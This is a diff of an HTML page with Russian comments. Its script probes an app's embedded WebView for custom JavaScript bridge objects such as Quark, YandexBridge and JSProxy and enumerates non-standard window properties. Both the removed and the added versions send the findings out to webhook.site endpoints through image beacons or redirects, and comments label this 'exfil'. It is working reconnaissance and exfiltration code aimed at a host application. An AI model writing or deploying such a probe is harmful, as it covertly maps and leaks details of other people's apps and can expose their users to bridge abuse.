@@ -5,31 +5,25 @@
     <h1 id="status">Ждем исполнения скрипта...</h1>
 
     <script>
-        new Image().src = "https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?ping=alive";
-        // Функция для отправки данных через редирект (самый пробивной метод)
-        function sendData(param, value) {
-            window.location.href = "https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?" + param + "=" + encodeURIComponent(value);
-        }
+    (function() {
+        // Список того, что нам НЕ интересно (стандарт браузера)
+        var standard = ['window', 'document', 'location', 'navigator', 'console', 'chrome', 'webkit', 'external', 'Object', 'Function', 'Array', 'Number', 'parseFloat', 'parseInt', 'Infinity', 'NaN', 'undefined', 'Boolean', 'String', 'Symbol', 'Date', 'Promise', 'RegExp', 'Error', 'EvalError', 'RangeError', 'ReferenceError', 'SyntaxError', 'TypeError', 'URIError', 'JSON', 'Math', 'Intl', 'ArrayBuffer', 'Uint8Array', 'Int8Array', 'Uint16Array', 'Int16Array', 'Uint32Array', 'Int32Array', 'Float32Array', 'Float64Array', 'Uint8ClampedArray', 'BigInt64Array', 'BigUint64Array', 'DataView', 'Map', 'Set', 'WeakMap', 'WeakSet', 'Proxy', 'Reflect', 'decodeURI', 'decodeURIComponent', 'encodeURI', 'encodeURIComponent', 'escape', 'unescape', 'eval', 'isFinite', 'isNaN', 'atob', 'btoa', 'setTimeout', 'clearTimeout', 'setInterval', 'clearInterval', 'requestAnimationFrame', 'cancelAnimationFrame', 'performance', 'screen', 'devicePixelRatio', 'styleMedia', 'parent', 'opener', 'frames', 'self', 'top', 'length', 'history', 'customElements', 'locationbar', 'menubar', 'personalbar', 'scrollbars', 'statusbar', 'toolbar', 'status', 'closed', 'crypto', 'indexedDB', 'sessionStorage', 'localStorage', 'onbeforeinstallprompt', 'onappinstalled', 'visualViewport', 'speechSynthesis'];
 
-        try {
-            document.getElementById('status').innerText = "JS запущен, анализируем...";
-            
-            // 1. Проверяем наличие самого подозрительного объекта
-            var bridgeName = "None";
-            if (window.Quark) bridgeName = "Quark";
-            else if (window.YandexBridge) bridgeName = "YandexBridge";
-            else if (window.JSProxy) bridgeName = "JSProxy";
+        var custom = [];
+        
+        // Получаем вообще ВСЕ свойства объекта window
+        var allProps = Object.getOwnPropertyNames(window);
+        
+        allProps.forEach(function(prop) {
+            if (standard.indexOf(prop) === -1 && isNaN(prop)) {
+                custom.push(prop);
+            }
+        });
 
-            // 2. Вместо перебора всех ключей, берем только первые 10 для теста стабильности
-            var keys = Object.getOwnPropertyNames(window).slice(0, 15).join(',');
-
-            // 3. Пытаемся "вылететь" из WebView на вебхук с данными
-            sendData("exfil", "Bridge:" + bridgeName + "|Keys:" + keys);
-
-        } catch (e) {
-            // Если скрипт упал - отправляем ошибку
-            sendData("error", e.message);
-        }
-    </script>
+        // Отправляем только "самописные" объекты
+        var data = custom.join(',');
+        new Image().src = 'https://webhook.site/8b31d71f-32ab-418d-9e3f-e9dd72738799?custom_found=' + encodeURIComponent(data);
+    })();
+</script>
 </body>
 </html>
